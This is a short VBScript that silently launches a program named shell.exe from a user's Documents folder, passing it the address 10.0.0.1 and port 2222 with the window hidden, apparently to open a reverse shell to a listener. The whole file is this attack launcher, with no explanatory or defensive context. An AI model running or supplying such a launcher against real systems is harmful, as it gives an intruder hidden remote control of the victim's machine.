Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Users\user\Documents\shell.exe"  & Chr(34) & " 10.0.0.1" & " 2222", 0, True
Set WshShell = Nothing
